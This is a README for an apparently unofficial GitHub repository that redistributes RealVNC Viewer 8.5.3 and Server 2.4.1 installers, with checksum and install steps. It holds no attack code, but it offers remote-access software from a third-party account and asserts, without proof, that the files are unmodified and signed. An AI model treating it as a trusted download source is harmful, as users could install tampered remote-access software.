# RealVNC Viewer and Server for Windows

Windows installers for **RealVNC Viewer 8.5.3** and **RealVNC Server 2.4.1**, packaged together as a ZIP.

> RealVNC is a product of RealVNC Ltd. This repository is independently maintained and is not affiliated with or endorsed by RealVNC Ltd. The software remains subject to its publisher's license terms.

## Download

Get the latest package from [GitHub Releases](https://github.com/RealVNCsoft/realvnc-download/releases/latest):

- `RealVNC-Connect-Windows-8.5.3-2.4.1.zip` - contains the original Viewer MSI and Server EXE installers.
- `SHA256SUMS.txt` - SHA-256 checksums for the package and each installer.

The installers are included unmodified. Verify the downloaded package before extracting it:

```powershell
Get-FileHash .\RealVNC-Connect-Windows-8.5.3-2.4.1.zip -Algorithm SHA256
```

Compare the result with the package entry in `SHA256SUMS.txt`.

## Install

1. Extract the ZIP.
2. Run `RealVNC-Connect-Viewer-8.5.3-Windows.msi` to install Viewer.
3. Run `VNC-Server-Installer-2.4.1-Windows.exe` on the computer that should be available for remote access.
4. Follow the setup prompts and sign in or configure access as required by your RealVNC subscription.

Viewer and Server are separate products and can be installed independently. Use remote access only on computers you own or are authorized to manage.

## Versions and integrity

| Component | Version | Package file |
|---|---:|---|
| RealVNC Viewer | 8.5.3 | `RealVNC-Connect-Viewer-8.5.3-Windows.msi` |
| RealVNC Server | 2.4.1 | `VNC-Server-Installer-2.4.1-Windows.exe` |

Both installer files carry valid Authenticode signatures from **RealVNC Ltd**. SHA-256 values are provided in `SHA256SUMS.txt`.

## License and trademarks

RealVNC Viewer and Server are proprietary software. Use is governed by the applicable RealVNC end-user license and subscription terms; obtaining this package does not grant additional rights. RealVNC and VNC are trademarks of RealVNC Ltd. This repository is not an official RealVNC support channel.

## Project links

- [Product information page](https://realvncsoft.github.io/)
- [Releases](https://github.com/RealVNCsoft/realvnc-download/releases)
- [Profile](https://github.com/RealVNCsoft)
